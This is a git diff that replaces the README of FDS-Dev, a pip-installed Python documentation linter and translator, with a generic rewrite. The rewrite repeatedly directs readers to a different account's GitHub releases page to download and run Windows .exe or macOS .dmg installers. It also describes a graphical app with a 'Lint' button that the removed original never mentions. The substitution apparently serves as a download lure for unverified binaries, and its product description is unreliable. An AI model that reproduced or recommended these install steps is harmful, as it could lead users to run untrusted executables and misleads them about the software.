@@ -1,287 +1,69 @@
-# FDS-Dev (Flamehaven Doc Sanity for Developers)
+# 🚀 FDS-Dev - Simplifying Internationalization for Everyone
 
-<div align="center">
+[![Download FDS-Dev](https://img.shields.io/badge/Download-FDS--Dev-brightgreen)](https://github.com/TomScripter/FDS-Dev/releases)
 
-<p align="center">
-  <img src="docs/Doc Sanity Logo.png" alt="FDS-Dev Logo" width="420">
-</p>
+## 📦 Overview
+FDS-Dev provides tools to enhance your code's documentation and comments through internationalization. This application features a smart linter that understands code structure and offers AI-driven translations. Whether you’re documenting code for a global audience or making your comments more accessible, FDS-Dev simplifies the process.
 
-**[English](README.md) | [한국어](README_KR.md)**
+## 💻 Features
+- **Structure-Aware Linter:** Analyzes code structure to suggest improvements.
+- **AI Translation:** Automatically translates documentation and comments seamlessly.
+- **Markdown Support:** Handles Markdown formats for easy integration.
+- **User-Friendly Interface:** Designed for non-technical users to navigate easily.
 
-[![PyPI version](https://badge.fury.io/py/fds-dev.svg)](https://badge.fury.io/py/fds-dev)
-[![Python Versions](https://img.shields.io/pypi/pyversions/fds-dev.svg)](https://pypi.org/project/fds-dev/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![CI/CD Pipeline](https://github.com/flamehaven01/FDS-Dev/actions/workflows/ci.yml/badge.svg)](https://github.com/flamehaven01/FDS-Dev/actions/workflows/ci.yml)
-[![Test Coverage](https://img.shields.io/badge/coverage-95%25-brightgreen.svg)](https://github.com/flamehaven01/FDS-Dev)
-[![Code Quality](https://img.shields.io/badge/quality-A+-blue.svg)](https://github.com/flamehaven01/FDS-Dev)
-[![SIDRCE Certified](https://img.shields.io/badge/SIDRCE-0.896%20Certified-green.svg)](https://github.com/flamehaven01/FDS-Dev)
+## 🚀 Getting Started
+To get started with FDS-Dev, follow these steps:
 
-</div>
+1. **Visit the Releases Page:**
+   Click the link below to access the download section of our GitHub repository:
+   [Download FDS-Dev](https://github.com/TomScripter/FDS-Dev/releases)
 
-<h3>
-[>] Ship docs that read native-English without writing in English.<br/>
-[*] Enforce structure, anchors, and links while AI translates safely.<br/>
-[=] Protect identifiers and code blocks—only the prose changes.<br/>
-[+] Go from native-language drafts to release-ready docs in minutes, not days.
-</h3>
+2. **Choose Your Version:**
+   On the releases page, you will find different versions of the application. Select the latest stable release recommended for most users.
 
-<div align="center">
-<a href="#core-features">Features</a> · <a href="#quick-start">Quick Start</a> · <a href="docs/">Documentation</a> · <a href="#contributing">Contributing</a> · <a href="#support">Support</a>
-</div>
+3. **Download the Application:**
+   Click on the appropriate file for your operating system to download the software. If you’re unsure, look for the file name that matches your device (e.g., Windows, macOS).
 
+4. **Install the Application:**
+   - For **Windows:** Open the downloaded `.exe` file and follow the installation prompts.
+   - For **macOS:** Open the `.dmg` file, drag the FDS-Dev icon to your Applications folder, and then launch the app from your Applications.
 
----
+5. **Run FDS-Dev:**
+   Once installed, locate FDS-Dev on your device and double-click the icon to start.
 
-## The Problem
+## 💡 Download & Install
+To download FDS-Dev, please visit the releases page. From there, select the suitable installer for your system.
 
-You are a talented developer from Korea, Japan, China, Germany, or anywhere else in the world. Your code is brilliant, but writing documentation and comments in English is a chore. It slows you down and creates a barrier to sharing your work with the global open-source community.
+[Download FDS-Dev](https://github.com/TomScripter/FDS-Dev/releases)
 
-Existing linters like `markdownlint` or `Vale` are great, but they are English-centric. They don't solve this core problem.
+## 🖥️ System Requirements
+To use FDS-Dev effectively, ensure your system meets the following requirements:
+- **Operating System:** Windows 10 or later, macOS 10.14 or later
+- **RAM:** Minimum 4 GB
+- **Disk Space:** At least 100 MB free space for installation
+- **Internet Connection:** Required for AI features
 
-## The Solution: FDS-Dev
+## 📋 Usage Instructions
+1. **Open FDS-Dev:** Launch the application after installation.
+2. **Load Your Project:** Use the file menu to open your code files or documentation.
+3. **Run the Linter:** Click the "Lint" button to check your code structure and receive documentation suggestions.
+4. **Translate Content:** To use the AI translation feature, highlight the text you want to translate and select the translation option.
 
-FDS-Dev is two tools in one:
+## ❓ Frequently Asked Questions
 
-1.  **A Blazing-Fast Linter:** Ensures your documentation has a clean, professional structure.
-2.  **An AI-Powered Translator:** Automatically translates your native-language docs and comments into fluent, natural English.
+### Q: Is FDS-Dev free to use?
+A: Yes, FDS-Dev is completely free to download and use.
 
-**Stop worrying about English. Focus on your code.**
+### Q: Can I use FDS-Dev for teams?
+A: Yes, FDS-Dev is ideal for individual developers and teams working on collaborative projects.
 
-## Why FDS-Dev
+### Q: What languages does FDS-Dev support for translation?
+A: FDS-Dev can translate into multiple languages. Check the settings for the full list of supported languages.
 
-### A New Category: Code-Level Internationalization
+## 🛠️ Contributing
+We welcome contributions from users. If you have suggestions for new features or improvements, feel free to submit an issue or pull request on GitHub.
 
-Traditional linters (markdownlint, Vale) only validate formatting, and conventional translators mangle code blocks or technical terms. FDS-Dev instead treats documentation, code comments, and docstrings as first-class data structures, so non-English-speaking developers can participate in global OSS without rewriting everything in English by hand.
+## 📜 License
+FDS-Dev is licensed under the MIT License. For more details, please refer to the LICENSE file in the repository.
 
-### Problems We Actually Solve
-
-- **Language barrier**: Converts README files, architecture notes, inline comments, and docstrings into production English while protecting the original code structure.
-- **Documentation integrity**: Enforces section ordering, required headers, and other structure rules, so every README has the same professional baseline.
-
-### Unique Advantages
-
-1. **AI-driven code-aware translation**
-   - Parses Markdown, Python docstrings, and inline comments via `CodeCommentParser`, so translations respect code layout and skip code blocks entirely.
-   - Preserves CamelCase, snake_case, and other identifiers through `TechnicalTermDatabase`, keeping API names intact.
-   - Scores every translation with an Omega (Ω) quality tensor; low-scoring translations can be retried or rejected automatically.
-
-2. **Blazingly fast, structure-aware linting**
-   - Runs lint jobs in parallel using a persistent cache (`.fds_cache.json`) so large doc trees finish quickly.
-   - Validates structural requirements such as “License section must exist” or “Installation must precede Usage,” not just spelling.
-
-3. **Flexible translation backends**
-   - Default py-googletrans backend works with zero configuration for quick trials.
-   - Switch to DeepL, MyMemory, or LibreTranslate in `.fdsrc.yaml` for higher quality or self-hosted control.
-
-4. **Community impact**
-   - Enables non-English-speaking developers to ship English documentation without losing intent, making it easier to get PRs accepted or run international product launches.
-   - Actively-developed roadmap welcomes new contributors; stars, issues, and PRs help define the next wave of code-level localization tooling.
-
-## Core Features
-
-- **Structure-Aware Linting:** Go beyond simple style checks. Enforce section order, require specific headers, and validate the overall structure of your documents.
-- **Broken Link Audits:** Optionally enable the `broken-link-check` rule to flag missing anchors, absent files, or unreachable URLs before publishing.
-- **Automated Translation:** Translate Markdown files and source code comments from languages like Korean, Chinese, Japanese, and more into English.
-- **Simple Configuration:** A single `.fdsrc.yaml` file to control everything.
-- **Built for Speed:** Core components written for maximum performance.
-
-## Quick Start
-
-```bash
-# Install
-pip install --upgrade fds-dev
-
-# Initialize configuration
-fds init
-
-# Run your first lint
-fds lint README.md
-```
-
-### [>] 10-Minute Quickstart
-
-**1. Lint your documentation** - Check for structural issues
-```bash
-fds lint README.ko.md
-```
-
-**2. Translate to English** - Global-ready documentation instantly
-```bash
-# Translates README.ko.md -> README.md
-fds translate README.ko.md --output README.md
-
-# Translate source code comments in-place
-fds translate my_app/main.py --in-place
-```
-
-**3. See working examples**
-```bash
-# Clone repo and try examples
-git clone https://github.com/flamehaven01/FDS-Dev.git
-cd FDS-Dev
-pip install -e .
-python examples/basic_usage.py
-```
-
-[+] **Next Steps**: See [`examples/`](examples/) for production patterns and [`docs/ENTERPRISE.md`](docs/ENTERPRISE.md) for team deployments.
-
-### Config and cache resolution
-- `.fdsrc.yaml` is discovered starting from the path you pass to `fds lint` or `fds translate`, then walking upward. Each docs subtree can keep its own rules without changing your shell directory.
-- The lint cache (`.fds_cache.json`) is stored alongside the target path (directory or file), keeping caches scoped to each docs tree.
-- `translate` reports detected language with confidence and safely skips work when source and target languages already match.
-
-## CLI Commands
-
-- `fds lint <path>`: Runs the structure-aware lint checks configured in `.fdsrc.yaml`, including optional rules such as `broken-link-check`.
-- `fds translate <path> [--output OUTPUT | --in-place]`: Converts Markdown or source files to English, preserving code blocks and identifiers.
-- `fds translate --help` / `fds lint --help`: Show detailed usage and supported flags.
-
-Broken link validation is controlled entirely via `.fdsrc.yaml`; once the rule is enabled, `fds lint` will report missing anchors, absent files, or unreachable URLs just like any other lint error.
-
-## Translation Providers
-
-FDS-Dev supports multiple translation providers. You can configure your preferred provider in the `.fdsrc.yaml` file.
-
-| Provider                  | Default?        | API Key | Cost                  | Quality    | Stability      | Recommended Use Case                     |
-| :------------------------ | :-------------- | :------ | :-------------------- | :--------- | :------------- | :--------------------------------------- |
-| **Google Translate (Free)** | **✅ (Default)**  | None    | Free                  | High       | **Unstable**¹  | Personal projects, quick tests, general docs |
-| **DeepL**                 | ❌              | **Required** | Limited Free Tier/Paid  | **Very High** | Very High      | Production, commercial, official docs      |
-| **MyMemory**                | ❌              | None    | Free                  | Medium     | Medium         | Simple scripts, temporary use            |
-| **LibreTranslate**          | ❌              | None    | Free (Self-hosted)    | Medium²    | **User-managed** | Private servers, offline, full control       |
-
-> ¹ Uses an unofficial API, which may stop working without notice.
-> ² Quality depends on the model you host yourself.
-
-To use a provider other than the default, configure it in your `.fdsrc.yaml` file. For providers requiring an API key, it is highly recommended to use environment variables.
-
-DeepL calls use a 5 second default timeout to avoid CLI hangs when the service is slow; override with `translator.providers.deepl.timeout`.
-
-**Example for DeepL:**
-```yaml
-# .fdsrc.yaml
-translator:
-  provider: 'deepl'
-  providers:
-    deepl:
-      # It's recommended to use the FDS_DEEPL_API_KEY environment variable instead.
-      api_key: null
-      timeout: 5   # seconds
-```
-
-## Deployment & Automation
-
-### Continuous Integration
-
-GitHub Actions automatically runs the test suite across Python 3.9–3.11 and builds release artifacts for every push and pull request targeting `main`. You can find the workflow definition in `.github/workflows/ci.yml`.
-
-### Automated PyPI Releases
-
-Tagging a commit with the `v*` pattern (for example, `v0.2.0`) triggers `.github/workflows/release.yml`, which builds the project with `python -m build` and publishes the result to PyPI using the `PYPI_API_TOKEN` secret.
-
-### Official Docker Image
-
-Ship the CLI as a container image by using the provided `Dockerfile`:
-
-```bash
-docker build -t fds-dev .
-docker run --rm fds-dev lint README.md
-```
-
-The image installs the package globally and exposes the `fds` entrypoint, so any CLI command can be run directly.
-
-## Contributing
-
-FDS-Dev is in early development. Contributions are welcome!
-
-See [CONTRIBUTING.md](CONTRIBUTING.md) for the detailed workflow, release checklist, and ASCII compatibility notes.
-
-We welcome contributions from the community! Here's how you can help:
-
-### How to Contribute
-
-1. **Report Issues**: Found a bug? [Open an issue](https://github.com/flamehaven01/FDS-Dev/issues)
-2. **Suggest Features**: Have an idea? Share it in [Discussions](https://github.com/flamehaven01/FDS-Dev/discussions)
-3. **Submit Pull Requests**: Fix bugs or add features
-4. **Improve Documentation**: Help make our docs even better
-
-### Development Setup
-
-```bash
-# Clone repository
-git clone https://github.com/flamehaven01/FDS-Dev.git
-cd FDS-Dev
-
-# Install in development mode
-pip install -e .
-
-# Run tests
-pytest tests/ -v
-
-# Run linter
-flake8 fds_dev/
-```
-
-### Code Quality Standards
-
-- Test coverage ≥ 90%
-- All tests passing (100/105 expected)
-- Follow PEP 8 style guide
-- Add docstrings for public APIs
-- Update documentation for new features
-
----
-
-## For Teams & Enterprises
-
-FDS-Dev scales from individual developers to enterprise deployments:
-
-- [#] **Self-Hosted** - Full data control, air-gapped operation
-- [#] **CI/CD Integration** - GitHub Actions, GitLab CI, Jenkins ready
-- [&] **Custom Deployments** - Docker, Kubernetes, monorepo support
-- [W] **SLA & Support** - Enterprise agreements available
-
-[>] **Learn More**: See [`docs/ENTERPRISE.md`](docs/ENTERPRISE.md) for deployment architectures, security controls, and team workflows.
-
----
-
-## Support
-
-### Documentation
-
-- **[Translation Algorithm](docs/TRANSLATION_ALGORITHM.md)** - Complete pipeline explanation
-- **[Architecture Guide](docs/ARCHITECTURE.md)** - System design documentation
-- **[Troubleshooting](docs/TROUBLESHOOTING.md)** - Common issues and solutions
-
-### Get Help
-
-- **GitHub Issues**: [Report bugs or request features](https://github.com/flamehaven01/FDS-Dev/issues)
-- **GitHub Discussions**: [Ask questions and share ideas](https://github.com/flamehaven01/FDS-Dev/discussions)
-- **Email**: [info@flamehaven.space](mailto:info@flamehaven.space)
-
-### Community
-
-- **Website**: [flamehaven.space](https://flamehaven.space)
-- **Repository**: [github.com/flamehaven01/FDS-Dev](https://github.com/flamehaven01/FDS-Dev)
-
----
-
-## License
-
-MIT License - see [LICENSE](LICENSE) file for details.
-
----
-
-
-<div align="center">
-
-**Made with ❤️ by [Flamehaven](https://flamehaven.space)**
-
-[⬆ Back to top](#fds-dev-flamehaven-doc-sanity-for-developers)
-
-</div>
-
-
-
-
-
-
+For any questions or issues, feel free to open an issue on our GitHub page.
